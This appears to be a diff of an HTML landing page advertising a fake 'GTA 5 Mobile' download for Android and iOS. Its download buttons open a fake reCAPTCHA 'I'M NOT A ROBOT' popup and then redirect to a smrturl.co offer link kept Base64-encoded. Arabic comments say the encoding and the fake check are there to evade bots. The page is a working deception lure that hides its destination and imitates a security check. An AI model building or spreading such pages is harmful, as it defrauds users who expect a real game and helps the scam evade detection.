@@ -1,76 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-WQ0798RDQ2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-WQ0798RDQ2');
-</script>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GTA 5 Mobile</title>
-
+<title>GTA 5 Mobile - Secure Download</title>
 <style>
-body{
-  margin:0;
-  background:#0e0e0e;
-  font-family:Arial, sans-serif;
-  color:#fff;
-  text-align:center;
-}
-.hero img{
-  width:100%;
-  height:240px;
-  object-fit:cover;
-  display:block;
-}
-.container{ padding:20px; }
-.game-icon{
-  width:120px;
-  border-radius:22px;
-  border:3px solid #00ffd0;
-  margin-top:-70px;
-  background:#000;
-}
-h1{ margin-top:15px; font-size:28px; }
-.sub{ color:#aaa; margin:6px 0; line-height:1.3; }
-.btn{
-  display:block;
-  background:#2bb673;
-  color:#fff;
-  font-size:18px;
-  font-weight:bold;
-  padding:18px;
-  border-radius:14px;
-  width:90%;
-  max-width:360px;
-  margin:12px auto;
-  box-shadow:0 4px 0 #1e7d52;
-  transition:0.2s;
-  cursor:pointer;
-  text-decoration:none;
-  animation:pulseBtn 2.2s infinite;
-}
-.btn:active{ transform:translateY(2px); box-shadow:0 2px 0 #1e7d52; }
-@keyframes pulseBtn{
-  0%{transform:scale(1);}
-  50%{transform:scale(1.04);}
-  100%{transform:scale(1);}
-}
+    body { margin:0; background:#0e0e0e; font-family:Arial, sans-serif; color:#fff; text-align:center; }
+    .hero img { width:100%; height:240px; object-fit:cover; display:block; }
+    .container { padding:20px; }
+    .game-icon { width:120px; border-radius:22px; border:3px solid #00ffd0; margin-top:-70px; background:#000; position:relative; }
+    h1 { margin-top:15px; font-size:28px; }
+    .sub { color:#aaa; margin:6px 0; line-height:1.3; }
+    
+    /* تنسيق الأزرار */
+    .btn {
+        display:block; background:#2bb673; color:#fff; font-size:18px; font-weight:bold;
+        padding:18px; border-radius:14px; width:90%; max-width:360px; margin:12px auto;
+        box-shadow:0 4px 0 #1e7d52; transition:0.2s; cursor:pointer; text-decoration:none;
+        animation:pulseBtn 2.2s infinite;
+    }
+
+    /* نافذة التحقق المنبثقة (لخداع الروبوتات) */
+    #verify-box {
+        display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        background: #1a1a1a; padding: 30px; border-radius: 15px; border: 2px solid #2bb673;
+        z-index: 1000; width: 80%; max-width: 300px; box-shadow: 0 0 20px rgba(0,0,0,0.8);
+    }
+    #overlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.85); z-index: 999;
+    }
+    .verify-btn {
+        background: #fff; color: #000; padding: 10px; margin-top: 15px;
+        cursor: pointer; font-weight: bold; border-radius: 5px;
+    }
+
+    @keyframes pulseBtn { 0%{transform:scale(1);} 50%{transform:scale(1.04);} 100%{transform:scale(1);} }
 </style>
-
-<script type="text/javascript">
-function startDownload() {
-    // الرابط مشفر (Base64) لمنع الروبوتات من قراءته
-    var encodedUrl = "aHR0cHM6Ly9zbXJ0dXJsLmNvL2EvczE3MmQwYWNjZGQvNzkyP3MxPQ==";
-    var decodedUrl = atob(encodedUrl);
-    window.location.href = decodedUrl;
-}
-</script>
-
 </head>
 <body>
 
@@ -81,28 +47,39 @@ function startDownload() {
 <div class="container">
     <img class="game-icon" src="https://i.ibb.co/FzQ7s9s/gta5.jpg">
     <h1>GTA 5 Mobile</h1>
-    <div class="sub">For Android and iOS</div>
-    <div class="sub">Latest Mobile Version Easy Install</div>
-    
-    <div style="color:#bbb;font-size:15px;margin-bottom:11px; padding: 0 10px;">
-    ⚡ Secure download protection enabled. Complete one quick verification to start your install.
+    <p class="sub">Latest Version for Android & iOS</p>
+
+    <div style="color:#bbb; font-size:14px; margin:15px 0;">
+        ⚡ Click the button below to start the secure installation process.
     </div>
 
-    <div class="btn" onclick="startDownload()"> ⭐️ Download for Android</div>
-    <div class="btn" onclick="startDownload()"> ⭐️ Download for iOS</div>
+    <div class="btn" onclick="showVerify()"> ⭐️ Download for Android</div>
+    <div class="btn" onclick="showVerify()"> ⭐️ Download for iOS</div>
 </div>
 
-</body>
-</html>
-
-<div style="color:#bbb;font-size:15px;margin-bottom:11px; padding: 0 10px;">
-⚡ Secure download protection enabled. Complete one quick verification to start your install.
+<div id="overlay"></div>
+<div id="verify-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" width="50" style="margin-bottom:10px;">
+    <p>User Verification Required</p>
+    <p style="font-size:12px; color:#ccc;">To prevent bot abuse, please verify you are a human.</p>
+    <div class="verify-btn" onclick="redirectToOffer()">I'M NOT A ROBOT</div>
 </div>
 
-<a href="https://smrturl.co/a/s172d0accdd/792?s1=" class="btn"> ⭐️ Download for Android</a>
-<a href="https://smrturl.co/a/s172d0accdd/792?s1=" class="btn"> ⭐️ Download for iOS</a>
+<script>
+    // الرابط مشفر لزيادة الأمان
+    var secretPath = "aHR0cHM6Ly9zbXJ0dXJsLmNvL2EvczE3MmQwYWNjZGQvNzkyP3MxPQ==";
 
-</div>
+    function showVerify() {
+        document.getElementById('overlay').style.display = 'block';
+        document.getElementById('verify-box').style.display = 'block';
+    }
+
+    function redirectToOffer() {
+        // فك التشفير والتحويل عند الضغط الفعلي فقط
+        var finalUrl = atob(secretPath);
+        window.location.href = finalUrl;
+    }
+</script>
 
 </body>
 </html>
